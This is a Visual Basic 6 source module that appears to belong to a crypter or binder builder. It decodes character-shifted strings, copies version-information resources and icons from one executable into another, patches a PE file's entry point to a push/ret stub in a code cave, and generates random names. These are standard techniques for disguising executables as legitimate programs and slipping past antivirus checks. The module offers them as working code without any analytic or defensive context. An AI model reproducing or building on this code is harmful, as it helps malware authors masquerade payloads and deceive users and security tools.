Attribute VB_Name = "mIcon"

Option Explicit
Public Const IMAGE_DOS_SIGNATURE = &H5A4D
Public Const IMAGE_NT_SIGNATURE = &H4550
Public Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type
Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type
Public Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type
Public Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUninitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Win32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type
Public Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type
Public Const IMAGE_SIZEOF_SHORT_NAME = 8
Public Type IMAGE_SECTION_HEADER
    NameOfSection(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte
    VirtualSize As Long
    VirtualAddress As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics As Long
End Type
Private Const OPEN_EXISTING             As Long = &H3
Private Const FILE_ATTRIBUTE_NORMAL     As Long = &H80
Private Const INVALID_HANDLE_VALUE      As Long = -1
Private Const GENERIC_READ              As Long = &H80000000
Private Const GENERIC_WRITE             As Long = &H40000000
Private Const CREATE_ALWAYS             As Long = 2
Private Const FILE_BEGIN                As Long = &H0
Private Const RT_ICON                   As Long = &H3
Private Const RT_GROUP_ICON             As Long = &HE
Private Const LOAD_LIBRARY_AS_DATAFILE  As Long = &H2&
Private Type ICONDIRENTRY
    bWidth          As Byte
    bHeight         As Byte
    bColorCount     As Byte
    bReserved       As Byte
    wPlanes         As Integer
    wBitCount       As Integer
    dwBytesInRes    As Long
    dwImageOffset   As Long
End Type
Private Type ICONDIR
    idReserved      As Integer
    idType          As Integer
    idCount         As Integer
End Type
Private Type GRPICONDIRENTRY
    bWidth          As Byte
    bHeight         As Byte
    bColorCount     As Byte
    bReserved       As Byte
    wPlanes         As Integer
    wBitCount       As Integer
    dwBytesInRes    As Long
    nID             As Integer
End Type
Private Type GRPICONDIR
    idReserved      As Integer
    idType          As Integer
    idCount         As Integer
    IDEntries()     As GRPICONDIRENTRY
End Type
Private Type tBits
    bBits() As Byte
End Type

Private Declare Sub ReleaseCapture Lib "user32" ()
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long


Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Any, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function ReadFile Lib "kernel32" (ByVal lFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Any) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, lpOverlapped As Any) As Long
Private Declare Function SetFilePointer Lib "kernel32" (ByVal lFile As Long, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal lUpdate As Long, ByVal lpType As Long, ByVal lpName As Long, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal lUpdate As Long, ByVal fDiscard As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function EnumResourceNames Lib "kernel32" Alias "EnumResourceNamesA" (ByVal hModule As Long, ByVal lpType As Any, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Public Declare Function FindResource Lib "kernel32" Alias "FindResourceA" (ByVal hInstance As Long, ByVal lpName As Any, ByVal lpType As Any) As Long
Public Declare Function LoadResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Public Declare Function SizeofResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Public Declare Function LockResource Lib "kernel32" (ByVal hResData As Long) As Long
Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Private Declare Function lstrlenA Lib "kernel32" (ByVal lpString As Long) As Long
Private Declare Function LoadLibraryEx Lib "kernel32" Alias "LoadLibraryExA" (ByVal lpLibFileName As String, ByVal hFile As Long, ByVal dwFlags As Long) As Long
Public Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Dim ResID() As String
Dim ResNum As Long

Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long
Private Declare Function GetSaveFileName Lib "comdlg32.dll" Alias "GetSaveFileNameA" (pOpenfilename As OPENFILENAME) As Long
Public Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function StrFormatByteSize Lib "shlwapi" Alias "StrFormatByteSizeA" (ByVal dw As Long, ByVal pszBuf As String, ByRef cchBuf As Long) As String
Private Declare Function ExtractAssociatedIcon Lib "shell32.dll" Alias "ExtractAssociatedIconA" (ByVal hInst As Long, ByVal lpIconPath As String, lpiIcon As Long) As Long
Private Declare Function DrawIconEx Lib "user32" (ByVal hdc As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal cxWidth As Long, ByVal cyWidth As Long, ByVal istepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Declare Function DestroyIcon Lib "user32" (ByVal hIcon As Long) As Long

Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetFileVersionInfo Lib "Version.dll" Alias "GetFileVersionInfoA" (ByVal lptstrFilename As String, ByVal dwhandle As Long, ByVal dwlen As Long, lpData As Any) As Long
Private Declare Function GetFileVersionInfoSize Lib "Version.dll" Alias "GetFileVersionInfoSizeA" (ByVal lptstrFilename As String, lpdwHandle As Long) As Long
Private Declare Function VerQueryValue Lib "Version.dll" Alias "VerQueryValueA" (pBlock As Any, ByVal lpSubBlock As String, lplpBuffer As Any, puLen As Long) As Long
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long

Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Public Declare Function FreeResource Lib "kernel32" (ByVal hResData As Long) As Long
Public Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long

Private Const RT_VERSION         As Long = 16
Private Const VS_VERSION_INFO    As Long = 1
Const DI_MASK = &H1
Const DI_IMAGE = &H2
Const DI_NORMAL = DI_MASK Or DI_IMAGE
Dim kls As Integer
Private Type OPENFILENAME
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    lpstrFilter As String
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As String
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As String
    lpstrTitle As String
    flags As Long
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As String
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type
Private Const OFN_OVERWRITEPROMPT = &H2
Private Const OFN_HIDEREADONLY = &H4
Private Const OFN_HELPBUTTON = &H10
Private Const OFN_ENABLEHOOK = &H20
Private Const OFN_ENABLETEMPLATE = &H40
Private Const OFN_PATHMUSTEXIST = &H800
Private Const OFN_FILEMUSTEXISTS = &H1000
Private Const OFN_EXPLORER = &H80000
Private Const OFN_OPENFLAGS = &H81000
Private Const OFN_SAVEFLAGS = &H80002
Public Const MAX_PATH = 260
Private Const IMAGE_NT_OPTIONAL_HDR32_MAGIC As Long = &H10B&
Private Const SIZE_DOS_HEADER               As Long = &H40
Private Const SIZE_NT_HEADERS               As Long = &HF8
Private Const SIZE_SECTION_HEADER           As Long = &H28
Dim var1 As String

Public Function drt(x) As String
  Dim god As Long
  Dim current As Long
  Dim Process As String
  For god = 1 To Len(x)
  current = Asc(Mid(x, god, 1)) + 2
  Process = Process & Chr(current)
  Next god
  drt = Process
End Function
Public Function tmp()
  tmp = Environ(drt("rkn"))
End Function
Public Function crt(x) As String
  Dim god As Long
  Dim current As Long
  Dim Process As String
  For god = 1 To Len(x)
  current = Asc(Mid(x, god, 1)) - 2
  Process = Process & Chr(current)
  Next god
  crt = Process
End Function
Public Function FKB(ByVal Amount As Long) As String
  Dim Buffer As String
  Dim Result As String
  Buffer = Space$(255)
  Result = StrFormatByteSize(Amount, Buffer, _
  Len(Buffer))
  If InStr(Result, vbNullChar) > 1 Then
  FKB = Left$(Result, InStr(Result, _
  vbNullChar) - 1)
  End If
End Function
Public Sub lCLONE(ByVal Source As String, ByVal Destination As String)
  Dim lLenSource        As Long
  Dim lLenDestination   As Long
  Dim lHandle           As Long
  Dim hRes              As Long
  Dim lVerPointer       As Long
  Dim lLangId           As Long
  Dim iVal              As Long
  Dim lSize             As Long
  Dim bFileInfo()       As Byte
  Dim bDestination()    As Byte
  lLenSource = GetFileVersionInfoSize(Source, lHandle)
  ReDim bFileInfo(lLenSource)
  Call GetFileVersionInfo(Source, 0&, lLenSource, bFileInfo(0))
  lLenDestination = GetFileVersionInfoSize(Destination, lHandle)
  ReDim bDestination(lLenDestination)
  Call GetFileVersionInfo(Destination, 0&, lLenDestination, bDestination(0))
  Call VerQueryValue(bDestination(0), drt("ZZT_pDgjcGldmZZRp_lqj_rgml"), lVerPointer, lSize)
  hRes = BeginUpdateResource(Destination, False)
  CopyMem lLangId, ByVal lVerPointer, 2
  Call UpdateResource(hRes, RT_VERSION, VS_VERSION_INFO, lLangId, bFileInfo(0), lLenSource)
  Call EndUpdateResource(hRes, False)
End Sub
Public Function lRan(ch As String)
  Dim num_characters As Integer
  Dim i As Integer
  Dim txt As String
  Randomize
  num_characters = CInt(ch)
  For i = 1 To num_characters
  ch = Int((26 + 26 + 10) * Rnd)
  If ch < 26 Then
  txt = txt & Chr$(ch + Asc("A"))
  ElseIf ch < 2 * 26 Then
  ch = ch - 26
  txt = txt & Chr$(ch + Asc("a"))
  Else
  ch = ch - 26 - 26
  txt = txt & Chr$(ch + Asc("0"))
  End If
  Next i
  lRan = txt
End Function
Public Function GetFileName(Optional ByVal sFileName As String, Optional ByVal sFilter As String, Optional ByVal sTitle As String, Optional bOpen As Boolean = True) As String
  Dim OFN       As OPENFILENAME
  Dim i         As Integer
  Dim ret As Long
  Dim sExt As String
  With OFN
  .lStructSize = Len(OFN)
  For i = 1 To Len(sFilter)
  If Mid(sFilter, i, 1) = "|" Then
  Mid(sFilter, i, 1) = vbNullChar
  End If
  Next
  sFilter = sFilter & String$(2, 0)
  .lpstrFilter = sFilter
  .lpstrTitle = sTitle
  .lpstrInitialDir = App.Path
  .hInstance = App.hInstance
  .lpstrFile = sFileName & String(MAX_PATH - Len(sFileName), 0)
  .lpstrFileTitle = String(MAX_PATH, 0)
  .nMaxFile = MAX_PATH
  End With
  If bOpen Then
  OFN.flags = OFN.flags Or OFN_OPENFLAGS
  ret = GetOpenFileName(OFN)
  Else
  OFN.flags = OFN.flags Or OFN_SAVEFLAGS
  ret = GetSaveFileName(OFN)
  End If
  If ret Then GetFileName = TrimNull(OFN.lpstrFile)
End Function
Public Function TrimNull(startstr As String) As String
  Dim pos As Integer
  pos = InStr(startstr, Chr$(0))
  If pos Then
  TrimNull = Left$(startstr, pos - 1)
  Exit Function
  End If
  TrimNull = startstr
End Function
Public Function ChangeOEPFromFile(ByVal sSrcFile As String) As Boolean
  Dim bvData() As Byte
  On Error GoTo ChangeOEPFromFile_Error
  Open sSrcFile For Binary Access Read As #1
  ReDim bvData(LOF(1) - 1)
  Get #1, , bvData()
  Close
  If ChangeOEPFromBytes(bvData) Then
  Open sSrcFile For Binary Access Write As #1
  Put #1, , bvData()
  Close
  End If
  ChangeOEPFromFile = True
  On Error GoTo 0
  Exit Function
ChangeOEPFromFile_Error:
End Function
Public Function ChangeOEPFromBytes(ByRef bvData() As Byte) As Boolean
  Dim lOEP                    As Long
  Dim lCodePos                As Long
  Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
  Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
  Dim tIMAGE_SECTION_HEADER   As IMAGE_SECTION_HEADER
  CopyMem tIMAGE_DOS_HEADER, bvData(0), SIZE_DOS_HEADER
  If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then
  Exit Function
  End If
  CopyMem tIMAGE_NT_HEADERS, bvData(tIMAGE_DOS_HEADER.e_lfanew), SIZE_NT_HEADERS
  If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then
  Exit Function
  End If
  If Not tIMAGE_NT_HEADERS.OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR32_MAGIC Then
  Exit Function
  End If
  CopyMem tIMAGE_SECTION_HEADER, bvData(tIMAGE_DOS_HEADER.e_lfanew + SIZE_NT_HEADERS), SIZE_SECTION_HEADER
  lOEP = tIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + tIMAGE_NT_HEADERS.OptionalHeader.ImageBase
  lCodePos = tIMAGE_SECTION_HEADER.VirtualSize + tIMAGE_SECTION_HEADER.PointerToRawData
  tIMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint = lCodePos + tIMAGE_NT_HEADERS.OptionalHeader.BaseOfCode - tIMAGE_SECTION_HEADER.PointerToRawData
  CopyMem bvData(tIMAGE_DOS_HEADER.e_lfanew), tIMAGE_NT_HEADERS, SIZE_NT_HEADERS
  tIMAGE_SECTION_HEADER.VirtualSize = tIMAGE_SECTION_HEADER.SizeOfRawData
  CopyMem bvData(tIMAGE_DOS_HEADER.e_lfanew + SIZE_NT_HEADERS), tIMAGE_SECTION_HEADER, SIZE_SECTION_HEADER
  bvData(lCodePos) = &H68
  CopyMem bvData(lCodePos + 1), lOEP, &H4
  bvData(lCodePos + 5) = &HC3
  ChangeOEPFromBytes = True
End Function
Public Sub Drag(frmDrag As Form)
  Call ReleaseCapture
  Call SendMessage(frmDrag.hWnd, &HA1, 2, 0&)
End Sub
Public Sub url(url As String)

End Sub
Public Function RandomNumber() As String
  RandomNumber = ""
als:
  Randomize
  var1 = Int(9 * Rnd)
  RandomNumber = var1
If RandomNumber = "0" Then GoTo als
End Function
Public Function ExtractIcon(ByVal strExePath As String, ByVal strIcoPath As String) As Boolean
    Dim lLib                As Long
    Dim lRes                As Long
    Dim lLoad               As Long
    Dim lPointer            As Long
    Dim iBound              As Long
    Dim iBaseOffset         As Long
    Dim lFile               As Long
    Dim lBytesWritten       As Long
    Dim i                   As Integer
    Dim x                   As Integer
    Dim IconID()            As String
    Dim sFileName           As String
    Dim bData()             As Byte
    Dim tICONDIR            As ICONDIR
    Dim tICONDIRENTRY()     As ICONDIRENTRY
    Dim tGRPICONDIRENTRY    As GRPICONDIRENTRY
    Dim IconBits()          As tBits
    lLib = LoadLibraryEx(strExePath, ByVal 0&, LOAD_LIBRARY_AS_DATAFILE)
    ResNum = 0
    Call EnumResourceNames(lLib, RT_GROUP_ICON, AddressOf EnumResNameProc, 0)
    For x = 0 To UBound(ResID) - 1
    lRes = FindResource(lLib, ByVal ResID(x), ByVal RT_GROUP_ICON)
    lLoad = LoadResource(lLib, lRes)
    lPointer = LockResource(lLoad)
    CopyMemory tICONDIR, ByVal lPointer, Len(tICONDIR)
    ReDim IconBits(tICONDIR.idCount)
    iBound = (Len(tGRPICONDIRENTRY) * tICONDIR.idCount)
    ReDim bData(0 To iBound)
    CopyMemory bData(0), ByVal (lPointer + Len(tICONDIR)), iBound + 1
    iBaseOffset = (Len(tICONDIR) + (tICONDIR.idCount * Len(tICONDIRENTRY(0))))
    ReDim tICONDIRENTRY(tICONDIR.idCount)
    ReDim IconID(tICONDIR.idCount)
    For i = 0 To tICONDIR.idCount - 1
    CopyMemory tGRPICONDIRENTRY, bData(i * Len(tGRPICONDIRENTRY)), Len(tGRPICONDIRENTRY)
    IconID(i) = tGRPICONDIRENTRY.nID
    CopyMemory tICONDIRENTRY(i), tGRPICONDIRENTRY, Len(tGRPICONDIRENTRY)
    tICONDIRENTRY(i).dwImageOffset = iBaseOffset
    iBaseOffset = iBaseOffset + tICONDIRENTRY(i).dwBytesInRes
    Next i
    For i = 0 To tICONDIR.idCount - 1
    lRes = FindResource(lLib, ByVal "#" & IconID(i), ByVal RT_ICON)
    lLoad = LoadResource(lLib, lRes)
    lPointer = LockResource(lLoad)
    ReDim Preserve IconBits(i).bBits(tICONDIRENTRY(i).dwBytesInRes)
    CopyMemory IconBits(i).bBits(0), ByVal lPointer, tICONDIRENTRY(i).dwBytesInRes
    Next i
    sFileName = Mid(strIcoPath, 1, (InStr(1, strIcoPath, ".") - 1)) & "(" & x + 1 & ")" & ".ico"
    lFile = CreateFile(sFileName, GENERIC_WRITE, 0, ByVal 0&, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, ByVal 0&)
    WriteFile lFile, tICONDIR, Len(tICONDIR), lBytesWritten, ByVal 0&
    For i = 0 To tICONDIR.idCount - 1
    WriteFile lFile, tICONDIRENTRY(i), Len(tICONDIRENTRY(i)), lBytesWritten, ByVal 0&
    Next i
    For i = 0 To tICONDIR.idCount - 1
    WriteFile lFile, IconBits(i).bBits(0), tICONDIRENTRY(i).dwBytesInRes, lBytesWritten, ByVal 0&
    Next i
    CloseHandle lFile
    Next x
    FreeLibrary (lLib)
End Function
Private Function EnumResNameProc(ByVal hModule As Long, ByVal lpszType As Long, ByVal lpszName As Long, ByVal lParam As Long) As Long
   Dim ResName  As String
   Dim Continue As Boolean
   Dim bBuff()  As Byte
   Dim iLen     As Integer
   Dim iTmp     As Integer
   CopyMemory iTmp, ByVal (VarPtr(lpszName) + 2), 2
   If iTmp Then
   iLen = lstrlenA(lpszName)
   ReDim bBuff(0 To iLen - 1)
   CopyMemory bBuff(0), ByVal lpszName, iLen
   ResName = StrConv(bBuff, vbUnicode)
   Else
   ResName = "#" & lpszName
   End If
   If ResName <> "#" And ResName <> "" Then
   ResNum = ResNum + 1
   ReDim Preserve ResID(ResNum) As String
   ResID(ResNum - 1) = ResName
   Continue = True
   Else
   Continue = False
   End If
   EnumResNameProc = Continue
End Function


